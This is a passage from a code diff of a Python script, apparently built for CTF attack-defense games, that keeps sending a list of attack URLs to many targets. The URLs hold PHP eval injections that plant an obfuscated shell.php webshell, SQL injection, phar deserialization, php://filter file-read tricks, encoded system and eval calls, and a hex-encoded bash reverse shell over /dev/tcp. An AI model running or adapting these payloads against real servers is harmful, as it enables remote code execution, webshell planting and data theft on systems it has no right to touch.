+http://TARGET_IP/index.php?controllers/admin/Form.php?site=%7D%7Bend%20if%7D%7Bif:1)eval($_POST[cmd]);if(1%7D%7Bend%20if%7D&cmd=fputs(fopen(%22shell.php%22,%22w%22),%22%3C?php%20%5C$e=chr('97').'ssert';%5C$e(%5C$_POST[asasa]);&%3E%22);
+http://TARGET_IP/index.php?finecms/Init.php&c=1=(substring((select%0A0x66%0Afrom%0Aflag%0Awhere%0Abinary(/flag)%3C0x2e2f)from%0A1))
+http://TARGET_IP/index.php?controllers/admin/Fcontent.php&page=phar://Up10aDs/y9c8v9ow3s6ans5o8oy5u3qnsdnckQVJFIFlPVSBLSURESU5HIE1Ffn4=%0Aeva.png/hahahaha
+http://TARGET_IP/index.php?core/M_Table.php&order=phar://Up10aDs/y9c8v9ow3s6ans5o8oy5u3qnsdnckQVJFIFlPVSBLSURESU5HIE1Ffn4=%0Aeva.png/hahahaha
+http://TARGET_IP/index.php?action=RestoreData
+http://TARGET_IP/index.php?r&groupid=aGlnaGxpZ2h0X2ZpbGUoIi9mbGFnIik7
+http://TARGET_IP/index.php?c4site=JHtldmFsKHN1YnN0cihoZXgyYmluKDY2NzA3NTc0NzMyODY2NmY3MDY1NmUyODIyNzM2ODY1NmM2YzJlNzA2ODcwMjIyYzIyNzcyMjI5MmMyMjNjM2Y3MDY4NzAyMDQwNjE3MzczNjU3Mjc0MjgyNDVmNTA0ZjUzNTQ1YjY4NjE2ODYxNjg2MTY4NjE1ZDI5M2IzZjNlKSwxLDY2KSl9
+http://TARGET_IP/index.php?rctotal=dmFyX2R1bXAoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw==
+http://TARGET_IP/index.php?controllers/admin/Tag.php&rsite=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?rr=$%7Bsystem(hex2bin(ff0a2f62696e2f62617368202d6320277368202d69203e26202f6465762f7463702f3132372e302e302e312f3434343420303e263127))%7D
+http://TARGET_IP/index.php?rpage=$%7Beval(substr(hex2bin(ff6576616c28245f524551554553545b635d293b),1,19))%7D
+http://TARGET_IP/index.php?rpage=phar://Up10aDs/y9c8v9ow3s6ans5o8oy5u3qnsdnckQVJFIFlPVSBLSURESU5HIE1Ffn4=%0Aeva.png/hahahaha
+http://TARGET_IP/index.php?rorder=fE86Njoic2VjcmV0IjoxOntzOjQ6ImdvZ28iO3M6NTU6ImhpZ2hsaWdodF9maWxlKCIvZmxhZyIpOyI7fQ==
+http://TARGET_IP/index.php?rb1=eval
+http://TARGET_IP/index.php?rcontrollers/admin/Linkage.php&id=%3Cinput%20type=%22text%22%20class=%22input-text%22%20name=%22data[uc_ip,x);a]%3E]%22%20id=%22uc_ip%22%20value=%22;eval($_POST[1]);%20%22%3E
+http://TARGET_IP/index.php?caction=ZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKTs=
+http://TARGET_IP/index.php?raction=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=../../../../../flag
+http://TARGET_IP/index.php?rpage=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=../../../../../flag
+http://TARGET_IP/index.php?rddcid=cGhhcjovL1VwMTBhRHMveTljOHY5b3czczZhbnM1bzhveTV1M3Fuc2RuY2tRVkpGSUZsUFZTQkxTVVJFU1U1SElFMUZmbjQ9CmV2YS5wbmcvaGFoYWhhaGE=
+'''.splitlines()
+
+#
+def main(target):
+    for url in fake_uri:
+        try:
+            # print "进入upupup()"
+            head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+                    'Connection': 'close',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Cache-Control': 'max-age=0'}
+            r_url = url.replace('TARGET_IP', target)
+            #####get请求#############
+            r=requests.get(r_url,headers=head,timeout=0.3)
+            print(r.status_code,target ,'success')
+
+        except Exception as e:
+            # print str(e)
+            pass
+
+if __name__ == '__main__':
+    # main()
+    while True:
+        pool = Pool(len(targets))  #批量
+        pool.map(main, targets)
+        time.sleep(30)
